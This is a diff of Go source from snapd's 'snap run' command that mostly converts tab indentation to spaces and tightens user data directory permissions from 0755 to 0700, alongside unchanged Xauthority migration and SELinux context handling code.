{\n-\t\t\toptionsSet++\n-\t\t}\n-\t}\n-\tif optionsSet > 1 {\n-\t\treturn fmt.Errorf(\"you can only use one of --hook, --command, and --timer\")\n-\t}\n-\n-\tif x.Revision != \"unset\" && x.Revision != \"\" && x.HookName == \"\" {\n-\t\treturn fmt.Errorf(i18n.G(\"-r can only be used with --hook\"))\n-\t}\n-\tif x.HookName != \"\" && len(args) > 0 {\n-\t\t// TRANSLATORS: %q is the hook name; %s a space-separated list of extra arguments\n-\t\treturn fmt.Errorf(i18n.G(\"too many arguments for hook %q: %s\"), x.HookName, strings.Join(args, \" \"))\n-\t}\n-\n-\tif err := maybeWaitForSecurityProfileRegeneration(x.client); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Now actually handle the dispatching\n-\tif x.HookName != \"\" {\n-\t\treturn x.snapRunHook(snapApp)\n-\t}\n-\n-\tif x.Command == \"complete\" {\n-\t\tsnapApp, args = antialias(snapApp, args)\n-\t}\n-\n-\tif x.Timer != \"\" {\n-\t\treturn x.snapRunTimer(snapApp, x.Timer, args)\n-\t}\n-\n-\treturn x.snapRunApp(snapApp, args)\n+        if len(args) == 0 {\n+                return fmt.Errorf(i18n.G(\"need the application to run as argument\"))\n+        }\n+        snapApp := args[0]\n+        args = args[1:]\n+\n+        // Catch some invalid parameter combinations, provide helpful errors\n+        optionsSet := 0\n+        for _, param := range []string{x.HookName, x.Command, x.Timer} {\n+                if param != \"\" {\n+                        optionsSet++\n+                }\n+        }\n+        if optionsSet > 1 {\n+                return fmt.Errorf(\"you can only use one of --hook, --command, and --timer\")\n+        }\n+\n+        if x.Revision != \"unset\" && x.Revision != \"\" && x.HookName == \"\" {\n+                return fmt.Errorf(i18n.G(\"-r can only be used with --hook\"))\n+        }\n+        if x.HookName != \"\" && len(args) > 0 {\n+                // TRANSLATORS: %q is the hook name; %s a space-separated list of extra arguments\n+                return fmt.Errorf(i18n.G(\"too many arguments for hook %q: %s\"), x.HookName, strings.Join(args, \" \"))\n+        }\n+\n+        if err := maybeWaitForSecurityProfileRegeneration(x.client); err != nil {\n+                return err\n+        }\n+\n+        // Now actually handle the dispatching\n+        if x.HookName != \"\" {\n+                return x.snapRunHook(snapApp)\n+        }\n+\n+        if x.Command == \"complete\" {\n+                snapApp, args = antialias(snapApp, args)\n+        }\n+\n+        if x.Timer != \"\" {\n+                return x.snapRunTimer(snapApp, x.Timer, args)\n+        }\n+\n+        return x.snapRunApp(snapApp, args)\n }\n \n func maybeWaitWhileInhibited(snapName string) error {\n-\t// If the snap is inhibited from being used then postpone running it until\n-\t// that condition passes. Inhibition UI can be dismissed by the user, in\n-\t// which case we don't run the application at all.\n-\tif features.RefreshAppAwareness.IsEnabled() {\n-\t\treturn waitWhileInhibited(snapName)\n-\t}\n-\treturn nil\n+        // If the snap is inhibited from being used then postpone running it until\n+        // that condition passes. Inhibition UI can be dismissed by the user, in\n+        // which case we don't run the application at all.\n+        if features.RefreshAppAwareness.IsEnabled() {\n+                return waitWhileInhibited(snapName)\n+        }\n+        return nil\n }\n \n // antialias changes snapApp and args if snapApp is actually an alias\n // for something else. If not, or if the args aren't what's expected\n // for completion, it returns them unchanged.\n func antialias(snapApp string, args []string) (string, []string) {\n-\tif len(args) < 7 {\n-\t\t// NOTE if len(args) < 7, Something is Wrong (at least WRT complete.sh and etelpmoc.sh)\n-\t\treturn snapApp, args\n-\t}\n-\n-\tactualApp, err := resolveApp(snapApp)\n-\tif err != nil || actualApp == snapApp {\n-\t\t// no alias! woop.\n-\t\treturn snapApp, args\n-\t}\n-\n-\tcompPoint, err := strconv.Atoi(args[2])\n-\tif err != nil {\n-\t\t// args[2] is not COMP_POINT\n-\t\treturn snapApp, args\n-\t}\n-\n-\tif compPoint <= len(snapApp) {\n-\t\t// COMP_POINT is inside $0\n-\t\treturn snapApp, args\n-\t}\n-\n-\tif compPoint > len(args[5]) {\n-\t\t// COMP_POINT is bigger than $#\n-\t\treturn snapApp, args\n-\t}\n-\n-\tif args[6] != snapApp {\n-\t\t// args[6] is not COMP_WORDS[0]\n-\t\treturn snapApp, args\n-\t}\n-\n-\t// it _should_ be COMP_LINE followed by one of\n-\t// COMP_WORDBREAKS, but that's hard to do\n-\tre, err := regexp.Compile(`^` + regexp.QuoteMeta(snapApp) + `\\b`)\n-\tif err != nil || !re.MatchString(args[5]) {\n-\t\t// (weird regexp error, or) args[5] is not COMP_LINE\n-\t\treturn snapApp, args\n-\t}\n-\n-\targsOut := make([]string, len(args))\n-\tcopy(argsOut, args)\n-\n-\targsOut[2] = strconv.Itoa(compPoint - len(snapApp) + len(actualApp))\n-\targsOut[5] = re.ReplaceAllLiteralString(args[5], actualApp)\n-\targsOut[6] = actualApp\n-\n-\treturn actualApp, argsOut\n+        if len(args) < 7 {\n+                // NOTE if len(args) < 7, Something is Wrong (at least WRT complete.sh and etelpmoc.sh)\n+                return snapApp, args\n+        }\n+\n+        actualApp, err := resolveApp(snapApp)\n+        if err != nil || actualApp == snapApp {\n+                // no alias! woop.\n+                return snapApp, args\n+        }\n+\n+        compPoint, err := strconv.Atoi(args[2])\n+        if err != nil {\n+                // args[2] is not COMP_POINT\n+                return snapApp, args\n+        }\n+\n+        if compPoint <= len(snapApp) {\n+                // COMP_POINT is inside $0\n+                return snapApp, args\n+        }\n+\n+        if compPoint > len(args[5]) {\n+                // COMP_POINT is bigger than $#\n+                return snapApp, args\n+        }\n+\n+        if args[6] != snapApp {\n+                // args[6] is not COMP_WORDS[0]\n+                return snapApp, args\n+        }\n+\n+        // it _should_ be COMP_LINE followed by one of\n+        // COMP_WORDBREAKS, but that's hard to do\n+        re, err := regexp.Compile(`^` + regexp.QuoteMeta(snapApp) + `\\b`)\n+        if err != nil || !re.MatchString(args[5]) {\n+                // (weird regexp error, or) args[5] is not COMP_LINE\n+                return snapApp, args\n+        }\n+\n+        argsOut := make([]string, len(args))\n+        copy(argsOut, args)\n+\n+        argsOut[2] = strconv.Itoa(compPoint - len(snapApp) + len(actualApp))\n+        argsOut[5] = re.ReplaceAllLiteralString(args[5], actualApp)\n+        argsOut[6] = actualApp\n+\n+        return actualApp, argsOut\n }\n \n func getSnapInfo(snapName string, revision snap.Revision) (info *snap.Info, err error) {\n-\tif revision.Unset() {\n-\t\tinfo, err = snap.ReadCurrentInfo(snapName)\n-\t} else {\n-\t\tinfo, err = snap.ReadInfo(snapName, &snap.SideInfo{\n-\t\t\tRevision: revision,\n-\t\t})\n-\t}\n-\n-\treturn info, err\n+        if revision.Unset() {\n+                info, err = snap.ReadCurrentInfo(snapName)\n+        } else {\n+                info, err = snap.ReadInfo(snapName, &snap.SideInfo{\n+                        Revision: revision,\n+                })\n+        }\n+\n+        return info, err\n }\n \n func createOrUpdateUserDataSymlink(info *snap.Info, usr *user.User) error {\n-\t// 'current' symlink for user data (SNAP_USER_DATA)\n-\tuserData := info.UserDataDir(usr.HomeDir)\n-\twantedSymlinkValue := filepath.Base(userData)\n-\tcurrentActiveSymlink := filepath.Join(userData, \"..\", \"current\")\n-\n-\tvar err error\n-\tvar currentSymlinkValue string\n-\tfor i := 0; i < 5; i++ {\n-\t\tcurrentSymlinkValue, err = os.Readlink(currentActiveSymlink)\n-\t\t// Failure other than non-existing symlink is fatal\n-\t\tif err != nil && !os.IsNotExist(err) {\n-\t\t\t// TRANSLATORS: %v the error message\n-\t\t\treturn fmt.Errorf(i18n.G(\"cannot read symlink: %v\"), err)\n-\t\t}\n-\n-\t\tif currentSymlinkValue == wantedSymlinkValue {\n-\t\t\tbreak\n-\t\t}\n-\n-\t\tif err == nil {\n-\t\t\t// We may be racing with other instances of snap-run that try to do the same thing\n-\t\t\t// If the symlink is already removed then we can ignore this error.\n-\t\t\terr = os.Remove(currentActiveSymlink)\n-\t\t\tif err != nil && !os.IsNotExist(err) {\n-\t\t\t\t// abort with error\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\n-\t\terr = os.Symlink(wantedSymlinkValue, currentActiveSymlink)\n-\t\t// Error other than symlink already exists will abort and be propagated\n-\t\tif err == nil || !os.IsExist(err) {\n-\t\t\tbreak\n-\t\t}\n-\t\t// If we arrived here it means the symlink couldn't be created because it got created\n-\t\t// in the meantime by another instance, so we will try again.\n-\t}\n-\tif err != nil {\n-\t\treturn fmt.Errorf(i18n.G(\"cannot update the 'current' symlink of %q: %v\"), currentActiveSymlink, err)\n-\t}\n-\treturn nil\n+        // 'current' symlink for user data (SNAP_USER_DATA)\n+        userData := info.UserDataDir(usr.HomeDir)\n+        wantedSymlinkValue := filepath.Base(userData)\n+        currentActiveSymlink := filepath.Join(userData, \"..\", \"current\")\n+\n+        var err error\n+        var currentSymlinkValue string\n+        for i := 0; i < 5; i++ {\n+                currentSymlinkValue, err = os.Readlink(currentActiveSymlink)\n+                // Failure other than non-existing symlink is fatal\n+                if err != nil && !os.IsNotExist(err) {\n+                        // TRANSLATORS: %v the error message\n+                        return fmt.Errorf(i18n.G(\"cannot read symlink: %v\"), err)\n+                }\n+\n+                if currentSymlinkValue == wantedSymlinkValue {\n+                        break\n+                }\n+\n+                if err == nil {\n+                        // We may be racing with other instances of snap-run that try to do the same thing\n+                        // If the symlink is already removed then we can ignore this error.\n+                        err = os.Remove(currentActiveSymlink)\n+                        if err != nil && !os.IsNotExist(err) {\n+                                // abort with error\n+                                break\n+                        }\n+                }\n+\n+                err = os.Symlink(wantedSymlinkValue, currentActiveSymlink)\n+                // Error other than symlink already exists will abort and be propagated\n+                if err == nil || !os.IsExist(err) {\n+                        break\n+                }\n+                // If we arrived here it means the symlink couldn't be created because it got created\n+                // in the meantime by another instance, so we will try again.\n+        }\n+        if err != nil {\n+                return fmt.Errorf(i18n.G(\"cannot update the 'current' symlink of %q: %v\"), currentActiveSymlink, err)\n+        }\n+        return nil\n }\n \n func createUserDataDirs(info *snap.Info) error {\n-\t// Adjust umask so that the created directories have the permissions we\n-\t// expect and are unaffected by the initial umask. While go runtime creates\n-\t// threads at will behind the scenes, the setting of umask applies to the\n-\t// entire process so it doesn't need any special handling to lock the\n-\t// executing goroutine to a single thread.\n-\toldUmask := syscall.Umask(0)\n-\tdefer syscall.Umask(oldUmask)\n-\n-\tusr, err := userCurrent()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(i18n.G(\"cannot get the current user: %v\"), err)\n-\t}\n-\n-\t// see snapenv.User\n-\tinstanceUserData := info.UserDataDir(usr.HomeDir)\n-\tinstanceCommonUserData := info.UserCommonDataDir(usr.HomeDir)\n-\tcreateDirs := []string{instanceUserData, instanceCommonUserData}\n-\tif info.InstanceKey != \"\" {\n-\t\t// parallel instance snaps get additional mapping in their mount\n-\t\t// namespace, namely /home/joe/snap/foo_bar ->\n-\t\t// /home/joe/snap/foo, make sure that the mount point exists and\n-\t\t// is owned by the user\n-\t\tsnapUserDir := snap.UserSnapDir(usr.HomeDir, info.SnapName())\n-\t\tcreateDirs = append(createDirs, snapUserDir)\n-\t}\n-\tfor _, d := range createDirs {\n-\t\tif err := os.MkdirAll(d, 0755); err != nil {\n-\t\t\t// TRANSLATORS: %q is the directory whose creation failed, %v the error message\n-\t\t\treturn fmt.Errorf(i18n.G(\"cannot create %q: %v\"), d, err)\n-\t\t}\n-\t}\n-\n-\tif err := createOrUpdateUserDataSymlink(info, usr); err != nil {\n-\t\treturn err\n-\t}\n-\n-\treturn maybeRestoreSecurityContext(usr)\n+        // Adjust umask so that the created directories have the permissions we\n+        // expect and are unaffected by the initial umask. While go runtime creates\n+        // threads at will behind the scenes, the setting of umask applies to the\n+        // entire process so it doesn't need any special handling to lock the\n+        // executing goroutine to a single thread.\n+        oldUmask := syscall.Umask(0)\n+        defer syscall.Umask(oldUmask)\n+\n+        usr, err := userCurrent()\n+        if err != nil {\n+                return fmt.Errorf(i18n.G(\"cannot get the current user: %v\"), err)\n+        }\n+\n+        // see snapenv.User\n+        instanceUserData := info.UserDataDir(usr.HomeDir)\n+        instanceCommonUserData := info.UserCommonDataDir(usr.HomeDir)\n+        createDirs := []string{instanceUserData, instanceCommonUserData}\n+        if info.InstanceKey != \"\" {\n+                // parallel instance snaps get additional mapping in their mount\n+                // namespace, namely /home/joe/snap/foo_bar ->\n+                // /home/joe/snap/foo, make sure that the mount point exists and\n+                // is owned by the user\n+                snapUserDir := snap.UserSnapDir(usr.HomeDir, info.SnapName())\n+                createDirs = append(createDirs, snapUserDir)\n+        }\n+        for _, d := range createDirs {\n+                if err := os.MkdirAll(d, 0700); err != nil {\n+                        // TRANSLATORS: %q is the directory whose creation failed, %v the error message\n+                        return fmt.Errorf(i18n.G(\"cannot create %q: %v\"), d, err)\n+                }\n+        }\n+\n+        if err := createOrUpdateUserDataSymlink(info, usr); err != nil {\n+                return err\n+        }\n+\n+        return maybeRestoreSecurityContext(usr)\n }\n \n // maybeRestoreSecurityContext attempts to restore security context of ~/snap on\n // systems where it's applicable\n func maybeRestoreSecurityContext(usr *user.User) error {\n-\tsnapUserHome := filepath.Join(usr.HomeDir, dirs.UserHomeSnapDir)\n-\tenabled, err := selinuxIsEnabled()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"cannot determine SELinux status: %v\", err)\n-\t}\n-\tif !enabled {\n-\t\tlogger.Debugf(\"SELinux not enabled\")\n-\t\treturn nil\n-\t}\n-\n-\tmatch, err := selinuxVerifyPathContext(snapUserHome)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"failed to verify SELinux context of %v: %v\", snapUserHome, err)\n-\t}\n-\tif match {\n-\t\treturn nil\n-\t}\n-\tlogger.Noticef(\"restoring default SELinux context of %v\", snapUserHome)\n-\n-\tif err := selinuxRestoreContext(snapUserHome, selinux.RestoreMode{Recursive: true}); err != nil {\n-\t\treturn fmt.Errorf(\"cannot restore SELinux context of %v: %v\", snapUserHome, err)\n-\t}\n-\treturn nil\n+        snapUserHome := filepath.Join(usr.HomeDir, dirs.UserHomeSnapDir)\n+        enabled, err := selinuxIsEnabled()\n+        if err != nil {\n+                return fmt.Errorf(\"cannot determine SELinux status: %v\", err)\n+        }\n+        if !enabled {\n+                logger.Debugf(\"SELinux not enabled\")\n+                return nil\n+        }\n+\n+        match, err := selinuxVerifyPathContext(snapUserHome)\n+        if err != nil {\n+                return fmt.Errorf(\"failed to verify SELinux context of %v: %v\", snapUserHome, err)\n+        }\n+        if match {\n+                return nil\n+        }\n+        logger.Noticef(\"restoring default SELinux context of %v\", snapUserHome)\n+\n+        if err := selinuxRestoreContext(snapUserHome, selinux.RestoreMode{Recursive: true}); err != nil {\n+                return fmt.Errorf(\"cannot restore SELinux context of %v: %v\", snapUserHome, err)\n+        }\n+        return nil\n }\n \n func (x *cmdRun) useStrace() bool {\n-\t// make sure the go-flag parser ran and assigned default values\n-\treturn x.ParserRan == 1 && x.Strace != \"no-strace\"\n+        // make sure the go-flag parser ran and assigned default values\n+        return x.ParserRan == 1 && x.Strace != \"no-strace\"\n }\n \n func (x *cmdRun) straceOpts() (opts []string, raw bool, err error) {\n-\tif x.Strace == \"with-strace\" {\n-\t\treturn nil, false, nil\n-\t}\n-\n-\tsplit, err := shlex.Split(x.Strace)\n-\tif err != nil {\n-\t\treturn nil, false, err\n-\t}\n-\n-\topts = make([]string, 0, len(split))\n-\tfor _, opt := range split {\n-\t\tif opt == \"--raw\" {\n-\t\t\traw = true\n-\t\t\tcontinue\n-\t\t}\n-\t\topts = append(opts, opt)\n-\t}\n-\treturn opts, raw, nil\n+        if x.Strace == \"with-strace\" {\n+                return nil, false, nil\n+        }\n+\n+        split, err := shlex.Split(x.Strace)\n+        if err != nil {\n+                return nil, false, err\n+        }\n+\n+        opts = make([]string, 0, len(split))\n+        for _, opt := range split {\n+                if opt == \"--raw\" {\n+                        raw = true\n+                        continue\n+                }\n+                opts = append(opts, opt)\n+        }\n+        return opts, raw, nil\n }\n \n func (x *cmdRun) snapRunApp(snapApp string, args []string) error {\n-\tsnapName, appName := snap.SplitSnapApp(snapApp)\n-\tinfo, err := getSnapInfo(snapName, snap.R(0))\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tapp := info.Apps[appName]\n-\tif app == nil {\n-\t\treturn fmt.Errorf(i18n.G(\"cannot find app %q in %q\"), appName, snapName)\n-\t}\n-\n-\tif !app.IsService() {\n-\t\tif err := maybeWaitWhileInhibited(snapName); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\treturn x.runSnapConfine(info, app.SecurityTag(), snapApp, \"\", args)\n+        snapName, appName := snap.SplitSnapApp(snapApp)\n+        info, err := getSnapInfo(snapName, snap.R(0))\n+        if err != nil {\n+                return err\n+        }\n+\n+        app := info.Apps[appName]\n+        if app == nil {\n+                return fmt.Errorf(i18n.G(\"cannot find app %q in %q\"), appName, snapName)\n+        }\n+\n+        if !app.IsService() {\n+                if err := maybeWaitWhileInhibited(snapName); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        return x.runSnapConfine(info, app.SecurityTag(), snapApp, \"\", args)\n }\n \n func (x *cmdRun) snapRunHook(snapName string) error {\n-\trevision, err := snap.ParseRevision(x.Revision)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tinfo, err := getSnapInfo(snapName, revision)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\thook := info.Hooks[x.HookName]\n-\tif hook == nil {\n-\t\treturn fmt.Errorf(i18n.G(\"cannot find hook %q in %q\"), x.HookName, snapName)\n-\t}\n-\n-\treturn x.runSnapConfine(info, hook.SecurityTag(), snapName, hook.Name, nil)\n+        revision, err := snap.ParseRevision(x.Revision)\n+        if err != nil {\n+                return err\n+        }\n+\n+        info, err := getSnapInfo(snapName, revision)\n+        if err != nil {\n+                return err\n+        }\n+\n+        hook := info.Hooks[x.HookName]\n+        if hook == nil {\n+                return fmt.Errorf(i18n.G(\"cannot find hook %q in %q\"), x.HookName, snapName)\n+        }\n+\n+        return x.runSnapConfine(info, hook.SecurityTag(), snapName, hook.Name, nil)\n }\n \n func (x *cmdRun) snapRunTimer(snapApp, timer string, args []string) error {\n-\tschedule, err := timeutil.ParseSchedule(timer)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"invalid timer format: %v\", err)\n-\t}\n-\n-\tnow := timeNow()\n-\tif !timeutil.Includes(schedule, now) {\n-\t\tfmt.Fprintf(Stderr, \"%s: attempted to run %q timer outside of scheduled time %q\\n\", now.Format(time.RFC3339), snapApp, timer)\n-\t\treturn nil\n-\t}\n-\n-\treturn x.snapRunApp(snapApp, args)\n+        schedule, err := timeutil.ParseSchedule(timer)\n+        if err != nil {\n+                return fmt.Errorf(\"invalid timer format: %v\", err)\n+        }\n+\n+        now := timeNow()\n+        if !timeutil.Includes(schedule, now) {\n+                fmt.Fprintf(Stderr, \"%s: attempted to run %q timer outside of scheduled time %q\\n\", now.Format(time.RFC3339), snapApp, timer)\n+                return nil\n+        }\n+\n+        return x.snapRunApp(snapApp, args)\n }\n \n var osReadlink = os.Readlink\n@@ -527,253 +527,253 @@ var osReadlink = os.Readlink\n // snapdHelperPath return the path of a helper like \"snap-confine\" or\n // \"snap-exec\" based on if snapd is re-execed or not\n func snapdHelperPath(toolName string) (string, error) {\n-\texe, err := osReadlink(\"/proc/self/exe\")\n-\tif err != nil {\n-\t\treturn \"\", fmt.Errorf(\"cannot read /proc/self/exe: %v\", err)\n-\t}\n-\t// no re-exec\n-\tif !strings.HasPrefix(exe, dirs.SnapMountDir) {\n-\t\treturn filepath.Join(dirs.DistroLibExecDir, toolName), nil\n-\t}\n-\t// The logic below only works if the last two path components\n-\t// are /usr/bin\n-\t// FIXME: use a snap warning?\n-\tif !strings.HasSuffix(exe, \"/usr/bin/\"+filepath.Base(exe)) {\n-\t\tlogger.Noticef(\"(internal error): unexpected exe input in snapdHelperPath: %v\", exe)\n-\t\treturn filepath.Join(dirs.DistroLibExecDir, toolName), nil\n-\t}\n-\t// snapBase will be \"/snap/{core,snapd}/$rev/\" because\n-\t// the snap binary is always at $root/usr/bin/snap\n-\tsnapBase := filepath.Clean(filepath.Join(filepath.Dir(exe), \"..\", \"..\"))\n-\t// Run snap-confine from the core/snapd snap.  The tools in\n-\t// core/snapd snap are statically linked, or mostly\n-\t// statically, with the exception of libraries such as libudev\n-\t// and libc.\n-\treturn filepath.Join(snapBase, dirs.CoreLibExecDir, toolName), nil\n+        exe, err := osReadlink(\"/proc/self/exe\")\n+        if err != nil {\n+                return \"\", fmt.Errorf(\"cannot read /proc/self/exe: %v\", err)\n+        }\n+        // no re-exec\n+        if !strings.HasPrefix(exe, dirs.SnapMountDir) {\n+                return filepath.Join(dirs.DistroLibExecDir, toolName), nil\n+        }\n+        // The logic below only works if the last two path components\n+        // are /usr/bin\n+        // FIXME: use a snap warning?\n+        if !strings.HasSuffix(exe, \"/usr/bin/\"+filepath.Base(exe)) {\n+                logger.Noticef(\"(internal error): unexpected exe input in snapdHelperPath: %v\", exe)\n+                return filepath.Join(dirs.DistroLibExecDir, toolName), nil\n+        }\n+        // snapBase will be \"/snap/{core,snapd}/$rev/\" because\n+        // the snap binary is always at $root/usr/bin/snap\n+        snapBase := filepath.Clean(filepath.Join(filepath.Dir(exe), \"..\", \"..\"))\n+        // Run snap-confine from the core/snapd snap.  The tools in\n+        // core/snapd snap are statically linked, or mostly\n+        // statically, with the exception of libraries such as libudev\n+        // and libc.\n+        return filepath.Join(snapBase, dirs.CoreLibExecDir, toolName), nil\n }\n \n func migrateXauthority(info *snap.Info) (string, error) {\n-\tu, err := userCurrent()\n-\tif err != nil {\n-\t\treturn \"\", fmt.Errorf(i18n.G(\"cannot get the current user: %s\"), err)\n-\t}\n-\n-\t// If our target directory (XDG_RUNTIME_DIR) doesn't exist we\n-\t// don't attempt to create it.\n-\tbaseTargetDir := filepath.Join(dirs.XdgRuntimeDirBase, u.Uid)\n-\tif !osutil.FileExists(baseTargetDir) {\n-\t\treturn \"\", nil\n-\t}\n-\n-\txauthPath := osGetenv(\"XAUTHORITY\")\n-\tif len(xauthPath) == 0 || !osutil.FileExists(xauthPath) {\n-\t\t// Nothing to do for us. Most likely running outside of any\n-\t\t// graphical X11 session.\n-\t\treturn \"\", nil\n-\t}\n-\n-\tfin, err := os.Open(xauthPath)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\tdefer fin.Close()\n-\n-\t// Abs() also calls Clean(); see https://golang.org/pkg/path/filepath/#Abs\n-\txauthPathAbs, err := filepath.Abs(fin.Name())\n-\tif err != nil {\n-\t\treturn \"\", nil\n-\t}\n-\n-\t// Remove all symlinks from path\n-\txauthPathCan, err := filepath.EvalSymlinks(xauthPathAbs)\n-\tif err != nil {\n-\t\treturn \"\", nil\n-\t}\n-\n-\t// Ensure the XAUTHORITY env is not abused by checking that\n-\t// it point to exactly the file we just opened (no symlinks,\n-\t// no funny \"../..\" etc)\n-\tif fin.Name() != xauthPathCan {\n-\t\tlogger.Noticef(\"WARNING: XAUTHORITY environment value is not a clean path: %q\", xauthPathCan)\n-\t\treturn \"\", nil\n-\t}\n-\n-\t// Only do the migration from /tmp since the real /tmp is not visible for snaps\n-\tif !strings.HasPrefix(fin.Name(), \"/tmp/\") {\n-\t\treturn \"\", nil\n-\t}\n-\n-\t// We are performing a Stat() here to make sure that the user can't\n-\t// steal another user's Xauthority file. Note that while Stat() uses\n-\t// fstat() on the file descriptor created during Open(), the file might\n-\t// have changed ownership between the Open() and the Stat(). That's ok\n-\t// because we aren't trying to block access that the user already has:\n-\t// if the user has the privileges to chown another user's Xauthority\n-\t// file, we won't block that since the user can just steal it without\n-\t// having to use snap run. This code is just to ensure that a user who\n-\t// doesn't have those privileges can't steal the file via snap run\n-\t// (also note that the (potentially untrusted) snap isn't running yet).\n-\tfi, err := fin.Stat()\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\tsys := fi.Sys()\n-\tif sys == nil {\n-\t\treturn \"\", fmt.Errorf(i18n.G(\"cannot validate owner of file %s\"), fin.Name())\n-\t}\n-\t// cheap comparison as the current uid is only available as a string\n-\t// but it is better to convert the uid from the stat result to a\n-\t// string than a string into a number.\n-\tif fmt.Sprintf(\"%d\", sys.(*syscall.Stat_t).Uid) != u.Uid {\n-\t\treturn \"\", fmt.Errorf(i18n.G(\"Xauthority file isn't owned by the current user %s\"), u.Uid)\n-\t}\n-\n-\ttargetPath := filepath.Join(baseTargetDir, \".Xauthority\")\n-\n-\t// Only validate Xauthority file again when both files don't match\n-\t// otherwise we can continue using the existing Xauthority file.\n-\t// This is ok to do here because we aren't trying to protect against\n-\t// the user changing the Xauthority file in XDG_RUNTIME_DIR outside\n-\t// of snapd.\n-\tif osutil.FileExists(targetPath) {\n-\t\tvar fout *os.File\n-\t\tif fout, err = os.Open(targetPath); err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\t\tif osutil.StreamsEqual(fin, fout) {\n-\t\t\tfout.Close()\n-\t\t\treturn targetPath, nil\n-\t\t}\n-\n-\t\tfout.Close()\n-\t\tif err := os.Remove(targetPath); err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\n-\t\t// Ensure we're validating the Xauthority file from the beginning\n-\t\tif _, err := fin.Seek(int64(os.SEEK_SET), 0); err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\t}\n-\n-\t// To guard against setting XAUTHORITY to non-xauth files, check\n-\t// that we have a valid Xauthority. Specifically, the file must be\n-\t// parseable as an Xauthority file and not be empty.\n-\tif err := x11.ValidateXauthority(fin); err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\t// Read data from the beginning of the file\n-\tif _, err = fin.Seek(int64(os.SEEK_SET), 0); err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\tfout, err := os.OpenFile(targetPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0600)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\tdefer fout.Close()\n-\n-\t// Read and write validated Xauthority file to its right location\n-\tif _, err = io.Copy(fout, fin); err != nil {\n-\t\tif err := os.Remove(targetPath); err != nil {\n-\t\t\tlogger.Noticef(\"WARNING: cannot remove file at %s: %s\", targetPath, err)\n-\t\t}\n-\t\treturn \"\", fmt.Errorf(i18n.G(\"cannot write new Xauthority file at %s: %s\"), targetPath, err)\n-\t}\n-\n-\treturn targetPath, nil\n+        u, err := userCurrent()\n+        if err != nil {\n+                return \"\", fmt.Errorf(i18n.G(\"cannot get the current user: %s\"), err)\n+        }\n+\n+        // If our target directory (XDG_RUNTIME_DIR) doesn't exist we\n+        // don't attempt to create it.\n+        baseTargetDir := filepath.Join(dirs.XdgRuntimeDirBase, u.Uid)\n+        if !osutil.FileExists(baseTargetDir) {\n+                return \"\", nil\n+        }\n+\n+        xauthPath := osGetenv(\"XAUTHORITY\")\n+        if len(xauthPath) == 0 || !osutil.FileExists(xauthPath) {\n+                // Nothing to do for us. Most likely running outside of any\n+                // graphical X11 session.\n+                return \"\", nil\n+        }\n+\n+        fin, err := os.Open(xauthPath)\n+        if err != nil {\n+                return \"\", err\n+        }\n+        defer fin.Close()\n+\n+        // Abs() also calls Clean(); see https://golang.org/pkg/path/filepath/#Abs\n+        xauthPathAbs, err := filepath.Abs(fin.Name())\n+        if err != nil {\n+                return \"\", nil\n+        }\n+\n+        // Remove all symlinks from path\n+        xauthPathCan, err := filepath.EvalSymlinks(xauthPathAbs)\n+        if err != nil {\n+                return \"\", nil\n+        }\n+\n+        // Ensure the XAUTHORITY env is not abused by checking that\n+        // it point to exactly the file we just opened (no symlinks,\n+        // no funny \"../..\" etc)\n+        if fin.Name() != xauthPathCan {\n+                logger.Noticef(\"WARNING: XAUTHORITY environment value is not a clean path: %q\", xauthPathCan)\n+                return \"\", nil\n+        }\n+\n+        // Only do the migration from /tmp since the real /tmp is not visible for snaps\n+        if !strings.HasPrefix(fin.Name(), \"/tmp/\") {\n+                return \"\", nil\n+        }\n+\n+        // We are performing a Stat() here to make sure that the user can't\n+        // steal another user's Xauthority file. Note that while Stat() uses\n+        // fstat() on the file descriptor created during Open(), the file might\n+        // have changed ownership between the Open() and the Stat(). That's ok\n+        // because we aren't trying to block access that the user already has:\n+        // if the user has the privileges to chown another user's Xauthority\n+        // file, we won't block that since the user can just steal it without\n+        // having to use snap run. This code is just to ensure that a user who\n+        // doesn't have those privileges can't steal the file via snap run\n+        // (also note that the (potentially untrusted) snap isn't running yet).\n+        fi, err := fin.Stat()\n+        if err != nil {\n+                return \"\", err\n+        }\n+        sys := fi.Sys()\n+        if sys == nil {\n+                return \"\", fmt.Errorf(i18n.G(\"cannot validate owner of file %s\"), fin.Name())\n+        }\n+        // cheap comparison as the current uid is only available as a string\n+        // but it is better to convert the uid from the stat result to a\n+        // string than a string into a number.\n+        if fmt.Sprintf(\"%d\", sys.(*syscall.Stat_t).Uid) != u.Uid {\n+                return \"\", fmt.Errorf(i18n.G(\"Xauthority file isn't owned by the current user %s\"), u.Uid)\n+        }\n+\n+        targetPath := filepath.Join(baseTargetDir, \".Xauthority\")\n+\n+        // Only validate Xauthority file again when both files don't match\n+        // otherwise we can continue using the existing Xauthority file.\n+        // This is ok to do here because we aren't trying to protect against\n+        // the user changing the Xauthority file in XDG_RUNTIME_DIR outside\n+        // of snapd.\n+        if osutil.FileExists(targetPath) {\n+                var fout *os.File\n+                if fout, err = os.Open(targetPath); err != nil {\n+                        return \"\", err\n+                }\n+                if osutil.StreamsEqual(fin, fout) {\n+                        fout.Close()\n+                        return targetPath, nil\n+                }\n+\n+                fout.Close()\n+                if err := os.Remove(targetPath); err != nil {\n+                        return \"\", err\n+                }\n+\n+                // Ensure we're validating the Xauthority file from the beginning\n+                if _, err := fin.Seek(int64(os.SEEK_SET), 0); err != nil {\n+                        return \"\", err\n+                }\n+        }\n+\n+        // To 